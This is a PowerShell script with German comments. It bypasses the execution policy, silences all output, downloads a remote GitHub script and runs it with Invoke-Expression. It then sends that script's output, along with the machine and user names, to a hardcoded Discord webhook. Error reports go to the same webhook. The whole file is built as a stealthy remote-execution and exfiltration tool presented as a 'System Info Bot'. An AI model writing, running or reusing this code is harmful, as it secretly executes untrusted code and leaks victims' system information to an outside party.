# PowerShell Script zum Ausführen von fuser.ps1 und Senden an Discord Webhook
# Verwendung: powershell -ExecutionPolicy Bypass -File fuser-webhook.ps1

# Discord Webhook URL (automatisch konfiguriert)
$DiscordWebhook = "https://discord.com/api/webhooks/1488158816964182142/Vn2X3QJ_yyLY4fAwRBQO5nvW6obruB4iyl88j4eZUTI6tOWTIgbeZtEr4gJ3NtSxWDu6"

# Unterdrücke Fehlerausgaben und stelle sicher, dass nichts angezeigt wird
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

try {
    # Speichere die Einstellungen um später Ausgaben zu supprimieren
    $oldVerbosePreference = $VerbosePreference
    $oldWarningPreference = $WarningPreference
    $oldInformationPreference = $InformationPreference
    
    # Unterdrücke alle Ausgaben
    $VerbosePreference = 'SilentlyContinue'
    $WarningPreference = 'SilentlyContinue'
    $InformationPreference = 'SilentlyContinue'
    
    # Führe das Original-Script aus und erfasse ALLE Ausgaben
    $output = Invoke-Expression (Invoke-RestMethod https://raw.githubusercontent.com/mitchabi/sspub/refs/heads/main/fuser.ps1) 2>&1
    
    # Stelle Einstellungen wieder her
    $VerbosePreference = $oldVerbosePreference
    $WarningPreference = $oldWarningPreference
    $InformationPreference = $oldInformationPreference
    
    # Konvertiere die Ausgabe zu String
    $resultText = $output | Out-String
    
    # Erstelle die Discord Embed Message
    $timestamp = Get-Date -Format "dd.MM.yyyy HH:mm:ss"
    $computerName = $env:COMPUTERNAME
    $username = $env:USERNAME
    
    $payload = @{
        "username" = "System Info Bot"
        "embeds" = @(
            @{
                "title" = "System Informationen"
                "description" = $resultText
                "color" = 3447003
                "fields" = @(
                    @{
                        "name" = "Computer"
                        "value" = $computerName
                        "inline" = $true
                    },
                    @{
                        "name" = "Benutzer"
                        "value" = $username
                        "inline" = $true
                    },
                    @{
                        "name" = "Zeitstempel"
                        "value" = $timestamp
                        "inline" = $false
                    }
                )
                "footer" = @{
                    "text" = "fuser.ps1 System Scanner"
                }
            }
        )
    } | ConvertTo-Json -Depth 10
    
    # Sende an Discord Webhook
    Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType 'application/json' -Body $payload | Out-Null
    
    # Leise beenden - keine Ausgabe
    exit 0
    
} catch {
    # Im Fehlerfall trotzdem an Discord melden
    $errorMessage = $_.Exception.Message
    
    $payload = @{
        "username" = "System Info Bot - ERROR"
        "embeds" = @(
            @{
                "title" = "Fehler beim Ausführen"
                "description" = $errorMessage
                "color" = 15158332
                "fields" = @(
                    @{
                        "name" = "Computer"
                        "value" = $env:COMPUTERNAME
                        "inline" = $true
                    }
                )
            }
        )
    } | ConvertTo-Json -Depth 10
    
    Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType 'application/json' -Body $payload | Out-Null
    exit 1
}
